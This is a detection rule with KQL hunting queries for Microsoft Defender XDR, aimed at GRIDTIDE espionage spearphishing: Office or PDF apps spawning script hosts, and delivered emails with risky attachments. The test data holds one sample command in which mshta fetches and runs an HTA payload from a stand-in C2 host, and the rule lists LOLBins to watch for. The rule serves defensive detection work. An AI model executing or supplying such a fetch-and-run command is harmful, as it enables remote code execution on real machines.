# Name  
GRIDTIDE - Malicious Email Attachment and Suspicious Child Process Execution

# Description  
This detection identifies potential GRIDTIDE initial access behavior where an email attachment is delivered and subsequently a suspicious child process (e.g., cmd.exe, powershell.exe, mshta.exe, rundll32.exe) is spawned by an Office application or PDF reader. This is a common espionage vector for deploying initial stage loaders.

# References  
- https://cloud.google.com/blog/topics/threat-intelligence/disrupting-gridtide-global-espionage-campaign

# Author  
- M4nbat

# Socials  
- https://www.linkedin.com/in/grjk83/  
- @knappresearchlb

# Threats  
- GRIDTIDE
- UNC2814

# MITRE ATT&CK  
- T1566.001 (Phishing: Spearphishing Attachment)  
- T1204.002 (User Execution: Malicious File)  
- T1059 (Command and Scripting Interpreter)

# Data Sources  
- Microsoft Defender XDR  
  - DeviceProcessEvents  
  - EmailAttachmentInfo  
  - EmailEvents

# Query  
## Query 1: Suspicious Child Process Spawned by Office App or PDF Reader  

```kql
// Test Data Table
let DeviceProcessEvents = datatable( Timestamp: datetime, DeviceId: string, DeviceName: string, ActionType: string, FileName: string, FolderPath: string, SHA256: string, ProcessCommandLine: string, ProcessId: long, AccountName: string, AccountDomain: string, InitiatingProcessFileName: string, InitiatingProcessCommandLine: string, InitiatingProcessId: long, InitiatingProcessParentFileName: string )
[
    // Case 1: Suspicious MS Word spawning mshta
    datetime(2024-02-25 08:00:00), "device-guid-1", "Workstation01.contoso.com", "ProcessCreated", "mshta.exe", "C:\\Windows\\System32\\mshta.exe", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "mshta.exe http://malicious-c2.com/payload.hta", 4120, "jdoe", "CONTOSO", "winword.exe", "winword.exe", 680, "explorer.exe",
    // Case 2: Standard user activity (should be excluded)
    datetime(2024-02-25 10:15:30), "device-guid-2", "Laptop-CEO.contoso.com", "ProcessCreated", "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "a5b3c2d1...", "chrome.exe", 8832, "asmith", "CONTOSO", "explorer.exe", "explorer.exe", 5100, "userinit.exe"
];
// Usage: Identify Office apps or PDF readers spawning common LOLBins
let SuspiciousParents = dynamic(["winword.exe", "excel.exe", "powerpnt.exe", "acrord32.exe", "foxitreader.exe"]);
let SuspiciousChildren = dynamic(["cmd.exe", "powershell.exe", "mshta.exe", "cscript.exe", "wscript.exe", "rundll32.exe", "regsvr32.exe"]);
DeviceProcessEvents
| where Timestamp > ago(14d)
| where ActionType == "ProcessCreated"
| where FileName in~ (SuspiciousChildren)
| where InitiatingProcessFileName in~ (SuspiciousParents)
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
```

## Query 2: Malicious Attachment Delivery in Espionage Campaigns  
``` kql
// Test Data Table
let EmailAttachmentInfo = datatable( Timestamp: datetime, NetworkMessageId: string, FileName: string, FileType: string, SHA256: string, SenderFromAddress: string, RecipientEmailAddress: string )
[
    datetime(2024-02-25 07:55:00), "msg-id-1234", "Strategic_Plan_2026.zip", "zip", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "attacker@external.com", "jdoe@contoso.com"
];
let EmailEvents = datatable( Timestamp: datetime, NetworkMessageId: string, DeliveryAction: string, ThreatTypes: string, Subject: string )
[
    datetime(2024-02-25 07:55:00), "msg-id-1234", "Delivered", "", "URGENT: Strategic Plan"
];
// Usage: Identify delivered emails with high-risk attachments typically seen in espionage campaigns
EmailAttachmentInfo
| where Timestamp > ago(14d)
| where FileType in~ ("zip", "rar", "iso", "img", "lnk", "vbs", "js", "wsf")
| join kind=inner (EmailEvents | where Timestamp > ago(14d) | where DeliveryAction == "Delivered") on NetworkMessageId
| project Timestamp, Subject, SenderFromAddress, RecipientEmailAddress, FileName, FileType, SHA256, DeliveryAction, ThreatTypes
```
